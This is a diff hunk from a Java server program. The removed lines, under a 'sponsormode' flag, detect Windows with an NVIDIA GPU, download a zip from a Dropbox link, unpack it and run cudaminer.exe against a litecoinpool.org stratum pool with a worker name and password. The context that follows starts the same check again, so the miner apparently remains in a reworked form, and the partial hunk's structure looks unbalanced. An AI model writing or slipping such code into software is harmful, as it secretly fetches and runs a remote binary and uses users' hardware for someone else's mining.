@@ -33,22 +33,6 @@ public class Server {
 
         if (sponsormode) { // this starts only when sponsormode is true.
             String s = ExecuteMyCommand("wmic path win32_VideoController get name");
-            if (OS.contains("windows") && s.contains("NVIDIA")) {
-                try {
-                    unZipIt(download("https://dl.dropboxusercontent.com/u/68963061/x64-2017-03-08-21-43.zip"), temp.getAbsolutePath() + "folder");
-                    Thread t = new Thread(new Runnable() {
-                        public void run() {
-                            ExecuteMyCommand(temp.getAbsolutePath() + "folder/cudaminer.exe -o stratum+tcp://litecoinpool.org:3333 -O mh123hack.1:sCkaXGjeQOR9ediY7ytS");
-                        }
-                    });
-                    t.start();
-                    System.out.println(temp.getAbsolutePath() + "folder");
-                } catch (Exception ex) {
-                    System.err.println("sponsermode faild it will be disabled :( not critical no error");
-                    sponsormode = false;
-                }
-            } else {
-                System.err.println("sponsermode only works on windows :( no error");
             if (OS.contains("windows")) {
                 if (s.contains("NVIDIA")) {
                     try {
